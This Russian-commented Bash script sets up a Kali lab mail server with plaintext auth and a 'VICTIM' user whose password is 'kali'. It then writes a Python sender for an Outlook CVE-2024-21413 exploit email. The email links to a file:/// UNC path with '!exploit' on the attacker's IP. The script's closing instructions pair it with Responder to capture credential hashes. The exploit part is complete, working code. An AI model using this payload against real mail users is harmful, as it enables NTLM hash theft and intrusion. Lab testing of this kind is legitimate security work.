#!/bin/bash

# Проверяем, что скрипт запущен от root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Пожалуйста, запустите скрипт с правами sudo: sudo $0"
  exit 1
fi

echo "[*] Начинаем автоматическую настройку лабораторного стенда..."

# 1. Автоматическое определение текущего IP-адреса интерфейса eth0
KALI_IP=$(ip -4 addr show eth0 | grep -oP '(?<=inet )\d+(\.\d+){3}')
if [ -z "$KALI_IP" ]; then
    # Если eth0 пустой, пробуем взять дефолтный IP
    KALI_IP=$(ip r get 1.1.1.1 | grep -oP '(?<=src )\d+(\.\d+){3}')
fi
echo "[+] Определен IP-адрес Kali: $KALI_IP"

# 2. Установка необходимых пакетов
echo "[*] Установка Postfix, Dovecot и дополнительных утилит..."
apt update && apt install -y postfix dovecot-imapd python3-dnspython python3-aiosmtpd

# 3. Настройка Postfix (SMTP)
echo "[*] Конфигурация почтового сервера Postfix..."
postconf -e "mydestination = kali.local, localhost.localdomain, localhost"
postconf -e "smtpd_sasl_auth_enable = yes"
postconf -e "smtpd_sasl_type = dovecot"
postconf -e "smtpd_sasl_path = private/auth"
postconf -e "smtpd_sasl_security_options = noanonymous"
postconf -e "broken_sasl_auth_clients = yes"
postconf -e "smtpd_recipient_restrictions = permit_mynetworks, permit_sasl_authenticated, reject_unauth_destination"

# 4. Настройка Dovecot (IMAP)
echo "[*] Конфигурация службы авторизации и ящиков Dovecot..."
# Разрешаем plain-текст авторизацию
sed -i 's/#disable_plaintext_auth = yes/disable_plaintext_auth = no/g' /etc/dovecot/conf.d/10-auth.conf
# РЕШЕНИЕ КОЛЛИЗИИ: Принудительный нижний регистр для логинов (VICTIM -> victim)
sed -i 's/#auth_username_format = %u/auth_username_format = %Lc/g' /etc/dovecot/conf.d/10-auth.conf
# Указываем формат хранения писем mbox
sed -i 's|#mail_location = .*|mail_location = mbox:~/mail:INBOX=/var/mail/%u|g' /etc/dovecot/conf.d/10-mail.conf

# Настраиваем unix-сокет для связки Postfix и Dovecot
cat << 'EOF' > /tmp/dovecot_auth_patch
service auth {
  unix_listener /var/spool/postfix/private/auth {
    mode = 0660
    user = postfix
    group = postfix
  }
}
EOF
cat /tmp/dovecot_auth_patch >> /etc/dovecot/conf.d/10-auth.conf
rm /tmp/dovecot_auth_patch

# 5. Создание пользователя VICTIM (если его еще нет)
if id "victim" &>/dev/null || id "VICTIM" &>/dev/null; then
    echo "[+] Пользователь VICTIM уже существует."
else
    echo "[*] Создание тестового пользователя VICTIM..."
    # Создаем пользователя с плохим именем (заглавные буквы) и паролем "kali"
    echo -e "kali\nkali" | adduser VICTIM --force-badname --gecos ""
fi

# Подготовка прав для почтового ящика
touch /var/mail/victim
chown victim:mail /var/mail/victim
chmod 0660 /var/mail/victim

# 6. Перезапуск служб
echo "[*] Перезапуск почтовых служб..."
systemctl daemon-reload
systemctl restart postfix dovecot
systemctl enable postfix dovecot

# 7. Генерация актуального Python-скрипта отправки эксплойта
echo "[*] Создание готового скрипта отправки CVE_exploit.py..."
cat << EOF > /home/kali/CVE_exploit.py
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

SENDER_EMAIL = 'attacker@kali.local' 
RECEIVER_EMAIL = 'VICTIM@kali.local'
KALI_IP = '$KALI_IP'

SMTP_SERVER = '127.0.0.1' 
SMTP_PORT = 25

html_content = f"""\\
<!DOCTYPE html>
<html lang="en">
<body>
    <p><a href="file:///\\\\\\\\{KALI_IP}\\\\test\\\\test.docx!exploit">Нажмите для проверки теста</a></p>
</body>
</html>"""

message = MIMEMultipart()
message['Subject'] = "Тестирование уязвимости CVE-2024-21413"
message["From"] = formataddr(('Тестовый Стенд', SENDER_EMAIL))
message["To"] = RECEIVER_EMAIL

msgHtml = MIMEText(html_content, 'html')
message.attach(msgHtml)

print("[*] Отправка письма на локальный Postfix...")
try:
    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.ehlo()
    server.sendmail(SENDER_EMAIL, [RECEIVER_EMAIL], message.as_string())
    print("\\n[+] Письмо успешно отправлено и ожидает в ящике VICTIM@kali.local!")
except Exception as error:
    print(f"\\n[-] Ошибка выполнения: {error}")
finally:
    try:
        server.quit()
    except:
        pass
EOF

chown kali:kali /home/kali/CVE_exploit.py

echo "--------------------------------------------------------"
echo "[+] Настройка стенда успешно завершена!"
echo "[!] Инструкция по запуску тестов:"
echo "    1. В одном терминале запустите: sudo responder -I eth0 -dwv"
echo "    2. Во втором терминале отправьте письмо: python3 /home/kali/CVE_exploit.py"
echo "    3. В Outlook нажмите F9, откройте письмо и кликните по ссылке."
echo "--------------------------------------------------------"
